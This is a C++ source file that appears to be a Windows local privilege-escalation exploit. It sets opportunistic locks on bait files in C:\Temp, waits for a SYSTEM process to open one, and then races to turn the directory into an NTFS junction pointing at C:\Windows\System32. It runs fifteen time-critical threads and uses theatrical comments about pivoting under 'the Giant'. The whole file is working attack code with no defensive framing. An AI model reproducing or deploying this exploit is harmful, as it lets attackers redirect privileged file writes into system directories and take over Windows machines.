#include <Windows.h>
#include <winioctl.h>
#include <vector>
#include <thread>
#include <iostream>

// Standard Reparse Buffer Header
#define REPARSE_MOUNTPOINT_HEADER_SIZE 8

typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    struct {
        USHORT SubstituteNameOffset;
        USHORT SubstituteNameLength;
        USHORT PrintNameOffset;
        USHORT PrintNameLength;
        WCHAR PathBuffer[1];
    } MountPointReparseBuffer;
} REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER;

// The "Pivot" - Replacing the floor beneath the Giant
bool ForceJunction(const std::wstring& dir, const std::wstring& target) {
    HANDLE hDir = CreateFileW(dir.c_str(), GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);

    if (hDir == INVALID_HANDLE_VALUE) return false;

    std::wstring ntTarget = L"\\??\\" + target;
    DWORD targetByteLen = (DWORD)(ntTarget.length() * sizeof(wchar_t));
    DWORD bufSize = FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer) + targetByteLen + 4;

    std::vector<BYTE> buffer(bufSize, 0);
    PREPARSE_DATA_BUFFER rdb = reinterpret_cast<PREPARSE_DATA_BUFFER>(buffer.data());

    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength = (USHORT)(targetByteLen + 12);
    rdb->MountPointReparseBuffer.SubstituteNameLength = (USHORT)targetByteLen;
    rdb->MountPointReparseBuffer.PrintNameOffset = (USHORT)(targetByteLen + 2);

    memcpy(rdb->MountPointReparseBuffer.PathBuffer, ntTarget.c_str(), targetByteLen);

    DWORD bytesReturned;
    BOOL success = DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, rdb, bufSize, NULL, 0, &bytesReturned, NULL);

    CloseHandle(hDir);
    return success;
}

// The Trap - Arming the Oplock on a High-Priority Thread
void ArmRace(int id, std::wstring workDir, std::wstring targetPath) {
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    std::wstring bait = workDir + L"\\target_" + std::to_wstring(id) + L".tmp";
    HANDLE hBait = CreateFileW(bait.c_str(), GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);

    if (hBait == INVALID_HANDLE_VALUE) return;

    OVERLAPPED ov = { 0 };
    ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

    // Request Level 1 Oplock (The exclusive lock that causes the "Hang")
    DeviceIoControl(hBait, FSCTL_REQUEST_OPLOCK_LEVEL_1, NULL, 0, NULL, 0, NULL, &ov);

    // Wait for the Giant to step on the trap
    if (WaitForSingleObject(ov.hEvent, INFINITE) == WAIT_OBJECT_0) {
        // SYSTEM has touched the file. The kernel has paused the Giant.
        // We have MICROSECONDS to act.
        CloseHandle(hBait);
        DeleteFileW(bait.c_str());

        if (ForceJunction(workDir, targetPath)) {
            std::wcout << L"[!] VORTEX THREAD " << id << L": PIVOT SUCCESSFUL." << std::endl;
            exit(0); // The world is saved.
        }
    }
}

int main() {
    std::wstring workDir = L"C:\\Temp\\Redsun_Vortex";
    std::wstring target = L"C:\\Windows\\System32";
    CreateDirectoryW(workDir.c_str(), NULL);

    std::vector<std::thread> swarm;
    for (int i = 0; i < 15; i++) {
        swarm.emplace_back(ArmRace, i, workDir, target);
    }

    for (auto& t : swarm) t.join();
    return 0;
}
